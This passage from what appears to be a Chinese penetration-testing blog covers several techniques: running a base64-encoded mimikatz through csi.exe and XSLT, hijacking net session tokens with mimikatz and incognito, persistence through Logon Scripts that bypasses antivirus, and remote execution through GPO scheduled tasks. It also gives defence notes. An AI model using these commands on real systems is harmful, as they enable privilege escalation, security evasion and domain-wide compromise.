MethodInfo method = a.EntryPoint;
object o = a.CreateInstance(method.Name);
method.Invoke(o, null);
</code></pre></div></div>

<p>mimikatz.exe作base64加密后保存的文件katz.txt已上传，地址为：
https://raw.githubusercontent.com/3gstudent/test/master/katz.txt</p>

<p>测试如图，成功解密并执行mimikatz.exe</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-2.png" alt="Alt text"></p>

<p><strong>2.执行.csx文件中的代码</strong></p>

<p>将上述测试代码写在katz.csx文件中</p>

<p>csi编译环境下运行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#load "c:\\test\\katz.csx"
</code></pre></div></div>

<p><strong>注:</strong></p>

<p>文件路径必须包含双引号，load前缀<code class="language-plaintext highlighter-rouge">#</code></p>

<p>测试如图，成功执行</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-3.png" alt="Alt text"></p>

<p><strong>3.在cmd下运行</strong></p>

<p>可在cmd下csi.exe后面直接加.csx文件的路径</p>

<p>例如:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\Program Files (x86)\MSBuild\14.0\Bin\csi.exe" c:\test\katz.csx
</code></pre></div></div>

<p>测试如图，成功执行</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-4.png" alt="Alt text"></p>

<p>当然，在Win10上面不是必须安装vs2015才能使用csi.exe，这也是Casey留给读者的作业，找到csi.exe使用需要的依赖项</p>

<p>我已经完成了这个作业，依赖项文件最少需要6.77MB，可在csi.exe的同级目录<code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\MSBuild\14.0\Bin</code>下找到，将csi.exe及其依赖性上传到Win10系统即可直接使用</p>

<p>依赖项文件列表如下：</p>

<ul>
  <li>Microsoft.CodeAnalysis.CSharp.dll</li>
  <li>Microsoft.CodeAnalysis.CSharp.Scripting.dll</li>
  <li>Microsoft.CodeAnalysis.dll</li>
  <li>Microsoft.CodeAnalysis.Scripting.dll</li>
  <li>System.AppContext.dll</li>
  <li>System.Collections.Immutable.dll</li>
  <li>System.IO.FileSystem.dll</li>
  <li>System.IO.FileSystem.Primitives.dll</li>
  <li>System.Reflection.Metadata.dll</li>
</ul>

<p><strong>补充：</strong></p>

<p>该方法只用于Win10</p>

<p><strong>防御：</strong>
Matt Graeber分享了他的应对方法，更新了Device Guard Bypass MitigationRules，地址如下：</p>

<p>https://twitter.com/mattifestation/status/781211230065332224</p>

<p>https://github.com/mattifestation/DeviceGuardBypassMitigationRules/</p>

<h2 id="0x03-execute-c-from-xslt-file">0x03 execute C# from XSLT file</h2>
<hr>

<p><strong>Reference:</strong></p>

<p>https://twitter.com/subTee/status/796737674954608641</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/4-1.png" alt="Alt text"></p>

<p><strong>POC地址:</strong></p>

<p>https://gist.github.com/subTee/c34d0499e232c1501ff9f0a8dd302cbd#file-script-ps1</p>

<p><strong>简介：</strong></p>

<p>Casey在Twitter分享了一个有意思的技巧，在XSLT文件转换的过程中执行C#代码，本节将分享这个技巧的心得，并扩充POC，结合之前的代码，实现通过XSLT文件执行shellcode</p>

<p><strong>XSLT：</strong></p>

<p>XSLT是extensible stylesheet language transformation(扩展样式表转换语言)的缩写</p>

<p>用于将XML文档转换成以下一种格式：</p>
<ul>
  <li>HTML</li>
  <li>XML</li>
  <li>XHTML</li>
  <li>XSLT</li>
  <li>文本</li>
</ul>

<p>在转换操作的过程中，可以执行c#或VB代码，同VisualStudio Persistence中在编译过程执行代码类似</p>

<p>XSLT在web前端中用的比较多</p>

<p><strong>实际测试：</strong></p>

<p>将calc.xslt，example.xml，script.ps1三个文件放于同级目录，设置script.ps1中的路径变量$path</p>

<p>执行script.ps1，生成output.xml，弹出计算器，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/4-2.png" alt="Alt text"></p>

<p>参考如下链接可获得编写XSLT的更多提示：
https://msdn.microsoft.com/en-us/library/wxaw5z5e(v=vs.110).aspx</p>

<p>于是基于之前的研究，实现了通过XSLT调用C#执行shellcode，地址如下：</p>

<p>https://github.com/3gstudent/Execute-CSharp-From-XSLT-TEST/</p>

<p><strong>注:</strong></p>

<p>主要是修改了calc.xslt文件</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on November 16, 2016
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows中net session的利用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在Windows系统中，使用net use命令能够实现远程连接网络中其他计算机的共享资源，连接建立后会创建一个net session。
在渗透测试中，如果我们获得了一台Windows主机的权限，在上面发现了net session，就可以利用这个net session，使用net session的token创建进程。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>查看net session的方法</li>
  <li>net session的利用</li>
  <li>net session的清除</li>
  <li>利用思路</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-测试环境">0x02 测试环境</h2>
<hr>

<p>COMPUTER01：</p>

<ul>
  <li>Win7 x64</li>
  <li>域内一台主机</li>
  <li>192.168.10.2</li>
  <li>使用帐号test1登录</li>
</ul>

<p>DC:</p>

<ul>
  <li>Server2008 R2x64</li>
  <li>域控服务器</li>
  <li>192.168.10.1</li>
</ul>

<p>在DC上使用域管理员帐号Administrator通过net use远程连接COMPUTER01，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/2-1.png" alt="Alt text"></p>

<h2 id="0x03-查看net-session的方法">0x03 查看net session的方法</h2>
<hr>

<h3 id="1cmd命令">1、cmd命令</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net session
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-1.png" alt="Alt text"></p>

<h3 id="2logonsessions">2、LogonSessions</h3>

<p>下载地址：</p>

<p>https://docs.microsoft.com/en-us/sysinternals/downloads/logonsessions</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-2.png" alt="Alt text"></p>

<p>可以发现，net session的Logon type为Network</p>

<h3 id="3c实现">3、c++实现</h3>

<p>首先通过Windows API LsaEnumerateLogonSessions()枚举当前的Logon Session</p>

<p>接着使用LsaGetLogonSessionData()获得每个Logon Session的具体信息</p>

<p>在程序编写上需要注意无法直接显示sid和时间，需要对格式进行转换</p>

<p>开源代码地址：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/ListLogonSessions.cpp</p>

<p>代码按照LogonSessions的格式输出结果</p>

<h3 id="4mimikatz">4、mimikatz</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
token::list
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-3.png" alt="Alt text"></p>

<p>TEST\Administrator对应的ID为6919466</p>

<h4 id="补充mimikatz的命令">补充mimikatz的命令</h4>

<p>查看当前token：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::whoami
</code></pre></div></div>

<p>恢复进程token：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::revert
</code></pre></div></div>

<p>假冒成system：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate
</code></pre></div></div>

<p>假冒成domain admin：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /domainadmin
</code></pre></div></div>

<p>假冒成enterprise admin：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /enterpriseadmin
</code></pre></div></div>

<p>假冒成admin：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /admin
</code></pre></div></div>

<p>假冒成id为123456的token：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /id:123456
</code></pre></div></div>

<h2 id="0x04-net-session的利用">0x04 net session的利用</h2>
<hr>

<p>net session的token保存在lsass进程中，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-0.png" alt="Alt text"></p>

<p>在利用上，net session等同于对其token的利用</p>

<h3 id="1mimikatz">1、mimikatz</h3>

<p>假冒成id为6919466的token：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /id:6919466
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>上述操作只改变了Thread Token</p>

<p>Windows下有两种token：Primary Token和Impersonation Token</p>

<p>Primary Token对应Process Token，每个进程都有唯一的Primary Token</p>

<p>Impersonation Token对应Thread Token，可以被修改</p>

<p>接下来，使用该token创建进程cmd.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>process::start cmd.exe
</code></pre></div></div>

<p>但是该命令不会使用新的Thread Token，也就是说进程cmd.exe并没有以TEST\Administrator启动</p>

<h4 id="原因如下">原因如下：</h4>

<p>https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_process.c#L38</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-5.png" alt="Alt text"></p>

<p>https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/modules/kull_m_process.c#L490</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-6.png" alt="Alt text"></p>

<p>mimikatz在执行<code class="language-plaintext highlighter-rouge">process::start</code>命令时，使用<code class="language-plaintext highlighter-rouge">CreateProcess</code>创建进程，并没有传入token</p>

<h4 id="解决方法">解决方法：</h4>

<p>修改mimikatz的源码，使用CreateProcessAsUser()创建进程，能够传入Token</p>

<p>当然，我们还可以使用其他工具来实现这个过程</p>

<h3 id="2使用incognito">2、使用incognito</h3>

<p>源代码开源地址：</p>

<p>https://github.com/fdiskyou/incognito2</p>

<p><strong>注：</strong></p>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a>曾介绍过incognito的用法</p>

<p>列出当前token：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe list_tokens -u
</code></pre></div></div>

<p>以”TEST\Administrator”启动cmd.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "TEST\Administrator" cmd.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/4-1.png" alt="Alt text"></p>

<p>net session利用成功，以用户”TEST\Administrator”启动进程cmd.exe，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/4-2.png" alt="Alt text"></p>

<h2 id="0x05-net-session的清除">0x05 net session的清除</h2>
<hr>

<h3 id="1cmd命令-1">1、cmd命令</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net session /delete /y
</code></pre></div></div>

<h3 id="2删除net-use连接">2、删除net use连接</h3>

<p>net use的发起方删除连接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use * /del /y
</code></pre></div></div>

<h2 id="0x06-利用思路">0x06 利用思路</h2>
<hr>

<h3 id="1本地提权">1、本地提权</h3>

<p>如果尚未获得本地管理员权限，但获得了SeImpersonate或者SeAssignPrimaryToken权限，就能利用net session中的token创建新进程，实现提权</p>

<p><strong>注：</strong></p>

<p>之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">《Windows本地提权工具Juicy Potato测试分析》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/">《渗透技巧——Windows Token九种权限的利用》</a>提到过这个方法</p>

<h3 id="2域内渗透">2、域内渗透</h3>

<p>取决于net session的权限，新创建的进程能够继承net session的token</p>

<h2 id="0x07-防御建议">0x07 防御建议</h2>
<hr>

<p>1、域环境内限制用户权限，尽量避免使用域管理员帐户远程连接
2、使用net use远程连接后记得及时清除</p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>本文介绍了利用net session的token创建进程的方法，分析利用思路，给出防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December  3, 2018
  </div>

  
</article><article class="post">
  <h1>Use Logon Scripts to maintain persistence</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>依旧是对后门利用方法做介绍，本次介绍的是使用Logon Scripts的方法。然而我在研究过程中发现了一个特别的用法，脚本优先于杀毒软件执行，能够绕过杀毒软件对敏感操作的拦截，本文将要具体介绍这个技巧。</p>

<p><strong>注:</strong></p>

<p>有些杀毒软件是可以做到优先于Logon Scripts启动的</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<ul>
  <li>Logon Scripts用法</li>
  <li>绕过360对wmi调用的拦截</li>
  <li>特别用法</li>
</ul>

<h2 id="0x02-logon-scripts用法">0x02 Logon Scripts用法</h2>
<hr>

<p>思路来自于Adam@Hexacorn，地址如下：</p>

<p>http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/</p>

<h3 id="简要介绍logon-scripts的用法">简要介绍Logon Scripts的用法</h3>

<p>注册表路径：<code class="language-plaintext highlighter-rouge">HKCU\Environment\</code></p>

<p>创建字符串键值： <code class="language-plaintext highlighter-rouge">UserInitMprLogonScript</code></p>

<p>键值设置为bat的绝对路径：<code class="language-plaintext highlighter-rouge">c:\test\11.bat</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-9/1-1.png" alt="Alt text"></p>

<p>bat内容如下：</p>

<p><code class="language-plaintext highlighter-rouge">start calc.exe</code></p>

<p>注销，登录</p>

<p>执行脚本11.bat，弹出计算器</p>

<h2 id="0x03-绕过360对通过wmi修改环境变量的拦截">0x03 绕过360对通过wmi修改环境变量的拦截</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/">《Use CLR to maintain persistence》</a>提到过使用wmic修改环境变量的方法</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"

wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
</code></pre></div></div>

<p>然而，360会对WMI的操作进行拦截，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-9/2-1.png" alt="Alt text"></p>

<p>其实通过WMI添加环境变量等价于在注册表<code class="language-plaintext highlighter-rouge">HKCR\Environment\</code>新建键值</p>

<p>所以对WMI的操作可以通过写注册表的操作进行代替</p>

<p>以上WMI命令可替换为如下powershell代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-ItemProperty "HKCU:\Environment\" COR_ENABLE_PROFILING -value "1" -propertyType string | Out-Null

New-ItemProperty "HKCU:\Environment\" COR_PROFILER -value "{11111111-1111-1111-1111-111111111111}" -propertyType string | Out-Null
</code></pre></div></div>

<h2 id="0x04-特别用法">0x04 特别用法</h2>
<hr>

<p>源于我的一个特别的想法</p>

<p>我在对该技巧研究的过程中，产生了一个有趣的想法，Logon Scripts启动的顺序是否优先于其他程序呢？</p>

<p>如果是的话，那么是否也优先于杀毒软件呢？</p>

<p>下面开始我的测试：</p>

<h3 id="1cmd输入如下代码">1、cmd输入如下代码</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="test",username="%username%",VariableValue="I run faster!"
</code></pre></div></div>

<p>不出意外，被拦截</p>

<h3 id="2设置logon-scripts">2、设置Logon Scripts</h3>

<p>11.bat代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="test",username="%username%",VariableValue="I run faster!"
reg query HKEY_CURRENT_USER\Environment /V test
pause
</code></pre></div></div>

<h3 id="3启用logon-scripts">3、启用Logon Scripts</h3>

<p>注册表路径：<code class="language-plaintext highlighter-rouge">HKCR\Environment\</code></p>

<p>创建字符串键值： <code class="language-plaintext highlighter-rouge">UserInitMprLogonScript</code></p>

<p>键值设置为bat的绝对路径：<code class="language-plaintext highlighter-rouge">c:\test\11.bat</code></p>

<p>由于调用WMI会被拦截，可以通过powershell实现，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.bat" -propertyType string | Out-Null
</code></pre></div></div>

<h3 id="4注销重新登录测试">4、注销，重新登录，测试</h3>

<p>如果注册表<code class="language-plaintext highlighter-rouge">HKCR\Environment\</code>成功被写入键值<code class="language-plaintext highlighter-rouge">test</code> <code class="language-plaintext highlighter-rouge">REG_SZ</code> <code class="language-plaintext highlighter-rouge">I run faster!</code>，说明Logon Scripts优先于杀毒软件执行，绕过杀毒软件的限制</p>

<p>完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-9/3.gif" alt="Alt text"></p>

<p>测试成功，验证我们的结论</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>监控注册表键值<code class="language-plaintext highlighter-rouge">HKCR\Environment\UserInitMprLogonScript</code></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Logon Scripts的用法进行了测试，并且介绍了一个特别用法，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。
站在防御的角度，要对此保持警惕。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on August  9, 2017
  </div>

  
</article><article class="post">
  <h1>域渗透——利用GPO中的计划任务实现远程执行</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows%E4%B8%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8/">《渗透基础——Windows下计划任务的使用》</a>曾介绍过计划任务的用法。而在域环境中，通过组策略(Group Policy Object)同样能够实现计划任务的远程执行，本文将要对这个方法进行介绍，分析利用思路。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容:</p>

<ul>
  <li>GPO中的计划任务简介</li>
  <li>通过Group Policy Management Console (GPMC) 实现计划任务的远程执行</li>
  <li>通过命令行实现计划任务的远程执行</li>
  <li>新建GPO实现远程执行</li>
  <li>修改已有的GPO，实现远程执行</li>
  <li>GPO的常用操作</li>
</ul>

<h2 id="0x02-简介">0x02 简介</h2>
<hr>

<p>值得阅读的资料：</p>

<p>http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/</p>

<p>https://adsecurity.org/?p=2716</p>

<p>http://www.sicherheitsforschung-magdeburg.de/uploads/journal/MJS_052_Willi_GPO.pdf</p>

<p>GPO全称Group Policy Objects，用来存储Active Directory中的策略</p>

<p>自Windows Server 2008开始，GPO开始支持计划任务，便于管理域中的计算机和用户</p>

<p>默认情况下，域用户的组策略每90分钟更新，随机偏移为0-30分钟，域控制器的组策略每5分钟更新</p>

<p><strong>注：</strong></p>

<p>可通过命令实现组策略的强制更新</p>

<p>默认组策略的保存位置：<code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>，所有域内主机都能访问</p>

<p><strong>注：</strong></p>

<p>之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《域渗透-利用SYSVOL还原组策略中保存的密码》</a>曾介绍过这个文件位置</p>

<p>默认存在两个组策略，每个文件夹对应一个组策略：</p>

<p><code class="language-plaintext highlighter-rouge">{6AC1786C-016F-11D2-945F-00C04fB984F9}</code>对应<code class="language-plaintext highlighter-rouge">Default Domain Controllers Policy</code></p>

<p><code class="language-plaintext highlighter-rouge">{31B2F340-016D-11D2-945F-00C04FB984F9}</code>对应<code class="language-plaintext highlighter-rouge">Default Domain Policy</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-21/2-1.png" alt="Alt text"></p>

<h2 id="0x03-通过group-policy-management-console-gpmc-实现计划任务的远程执行">0x03 通过Group Policy Management Console (GPMC) 实现计划任务的远程执行</h2>
<hr>

<p>在域控制器上，位置： <code class="language-plaintext highlighter-rouge">Administrative Tools</code> -&gt; <code class="language-plaintext highlighter-rouge">Group Policy Management</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-21/3-1.png" alt="Alt text"></p>

<p>选择域test.local，右键，选中第一个，创建GPO，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-21/3-2.png" alt="Alt text"></p>

<p>输入名称TestGPO1，这会创建一个全局的GPO，作用于所有域用户</p>

<p>选择TestGPO1，右键，<code class="language-plaintext highlighter-rouge">Edit...</code></p>

<p><code class="language-plaintext highlighter-rouge">User Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">Preferences</code> -&gt; <code class="language-plaintext highlighter-rouge">Control Panel Settings</code> -&gt; <code class="language-plaintext highlighter-rouge">Scheduled Tasks</code></p>

<p><code class="language-plaintext highlighter-rouge">New</code> -&gt; <code class="language-plaintext highlighter-rouge">Immediate Task(Windows Vista and later)</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-21/3-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Immediate Task会在每次组策略刷新时执行</p>

<p>四种计划任务的区别可参考官方文档：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770904(v%3dws.11)</p>

<p><strong>注：</strong></p>

<p>也可以选择位置<code class="language-plaintext highlighter-rouge">Computer Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">Preferences</code> -&gt; <code class="language-plaintext highlighter-rouge">Control Panel Settings</code> -&gt; <code class="language-plaintext highlighter-rouge">Scheduled Tasks</code></p>

<p>接下来，根据提示设置计划任务即可</p>

<p>为便于测试，执行的操作为将执行结果输出到文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-21/3-4.png" alt="Alt text"></p>

<p>这个组策略对应的ID为<code class="language-plaintext highlighter-rouge">{7D85A2EF-F525-4D8C-B12D-F2825F3A1224}</code>，在位置<code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\Policies\{7D85A2EF-F525-4D8C-B12D-F2825F3A1224}\User\Preferences\ScheduledTasks</code>下找到文件<code class="language-plaintext highlighter-rouge">ScheduledTasks.xml</code>，里面保存计划任务的配置信息</p>

<p>对于域内的主机，可以等待90分钟使组策略自动更新，也可以在客户端执行如下命令强制刷新组策略：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpupdate /force
</code></pre></div></div>

<p>客户端默认更新组策略的方式：</p>

<p>读取域共享目录中组策略的版本，位置为<code class="language-plaintext highlighter-rouge">\\&lt;domain.com&gt;\Policies\&lt;gpo id&gt;\GPT.ini</code>，如果版本高于本地保存的组策略版本，客户端将会更新本地的组策略</p>

<p>每次修改组策略，<code class="language-plaintext highlighter-rouge">\\&lt;domain.com&gt;\Policies\&lt;gpo id&gt;\GPT.ini</code>中的<code class="language-plaintext highlighter-rouge">Version</code>会增加</p>

<p>如果域控制器强制客户端刷新组策略，那么不会比较域共享目录中组策略的版本</p>

<h2 id="0x04-通过命令行实现计划任务的远程执行">0x04 通过命令行实现计划任务的远程执行</h2>
<hr>

<p>域控制器系统： Windows Server 2012 R2 x64
域名： test.com</p>

<h3 id="1创建一个gpo">1、创建一个GPO</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-GPO -Name TestGPO1
</code></pre></div></div>

<h3 id="2将gpo连到到域testcom">2、将GPO连到到域test.com</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-GPLink -Name TestGPO1 -Target "dc=test,dc=com"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>两条命令可以简写为一条命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new-gpo -name TestGPO1 | new-gplink -Target "dc=test,dc=com"
</code></pre></div></div>

<p>通过命令行回显获得ID为<code class="language-plaintext highlighter-rouge">0bfd3f0c-21a1-4eca-8a5e-1f0bd4dc64dc</code></p>

<h3 id="3创建计划任务">3、创建计划任务</h3>

<p>通过Group Policy Management Console (GPMC)创建的计划任务会自动注册</p>

<p>而我目前还没有找到注册计划任务的接口，所以只能寻找一个变通的方法</p>

<p>好在我最终找到了变通的解决方法，步骤如下：</p>

<h4 id="1导出gpo">(1)导出GPO</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backup-Gpo -Name TestGPO1 -Path C:\test
</code></pre></div></div>

<h4 id="2创建计划任务的配置文件scheduledtasksxml">(2)创建计划任务的配置文件ScheduledTasks.xml</h4>

<p>路径为<code class="language-plaintext highlighter-rouge">\\&lt;domain.com&gt;\Policies\&lt;gpo id&gt;\DomainSysvol\GPO\User\Preferences\ScheduledTasks\ScheduledTasks.xml</code></p>

<h4 id="3修改backupxml和gpreportxml">(3)修改<code class="language-plaintext highlighter-rouge">Backup.xml</code>和<code class="language-plaintext highlighter-rouge">gpreport.xml</code></h4>

<p>加入计划任务的配置信息</p>

<h4 id="4还原gpo">(4)还原GPO</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-GPO -BackupId &lt;backupid&gt; -TargetName TestGPO1 -Path C:\test
</code></pre></div></div>

<p>完整实现代码已开源，下载地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1</p>

<p><strong>注：</strong></p>

<p>下篇文章将会详细介绍原理和脚本实现细节</p>

<p>脚本命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath '\\dc.test.com\sysvol\test.com' -CommandArguments '-c "123 | Out-File C:\test\debug.txt"'
</code></pre></div></div>

<p>脚本自动实现以下操作：</p>

<ul>
  <li>将TestGPO备份至当前目录</li>
  <li>修改备份文件夹下的<code class="language-plaintext highlighter-rouge">Backup.xml</code>和<code class="language-plaintext highlighter-rouge">gpreport.xml</code></li>
  <li>在备份文件夹中生成文件<code class="language-plaintext highlighter-rouge">ScheduledTasks.xml</code></li>
  <li>还原TestGPO</li>
</ul>

<h3 id="4强制客户端刷新组策略">4、强制客户端刷新组策略</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-GPUpdate -Computer "TEST\COMPUTER-01"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Windows Server 2008 R2默认不支持该命令，Windows Server 2012支持</p>

<p>客户端的防火墙需要允许以下连接：</p>

<ul>
  <li>Remote Scheduled Tasks Management (RPC)</li>
  <li>Remote Scheduled Tasks Management (RPC-ERMAP)</li>
  <li>Windows Management Instrumentation (WMI-IN)</li>
</ul>

<p>官方资料：</p>

<p>https://docs.microsoft.com/en-us/powershell/module/grouppolicy/invoke-gpupdate?view=win10-ps</p>

<h3 id="5删除gpo">5、删除GPO</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-GPO -Name TestGPO1
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>通过Group Policy Management Console (GPMC)右键删除GPO不会删除对应的文件夹，Remove-GPO可以</p>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<p>前提是获得了域管理员的权限或者某个组策略的编辑权限</p>

<p>通用操作如下：</p>

<p>加载GroupPolicy模块：</p>

